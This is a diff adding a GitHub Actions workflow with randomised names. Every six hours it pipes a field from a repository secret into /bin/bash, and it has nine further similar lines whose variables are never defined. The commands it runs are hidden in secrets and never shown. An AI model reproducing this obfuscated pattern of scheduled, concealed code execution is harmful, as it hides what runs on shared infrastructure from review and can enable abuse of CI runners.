@@ -1,0 +1,25 @@
+name: licuxiangkuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: licuxiangkuan
+        env:
+          mrmdd4: ${{ secrets.mrmdd4 }}
+        run: |
+          echo $mrmdd4 | jq -r .wa42 | /bin/bash
+          echo $qhe46 | jq -r .bv372 | /bin/bash
+          echo $lce6323 | jq -r .b5648 | /bin/bash
+          echo $iuyio0 | jq -r .tgcpy8796 | /bin/bash
+          echo $un05177 | jq -r .lywr4114 | /bin/bash
+          echo $brlzl016 | jq -r .wzlr71158 | /bin/bash
+          echo $zghjr64536 | jq -r .ovr5466 | /bin/bash
+          echo $lgkz79035 | jq -r .vl0 | /bin/bash
+          echo $olc346 | jq -r .lty421 | /bin/bash
+          echo $m50 | jq -r .med604 | /bin/bash
+
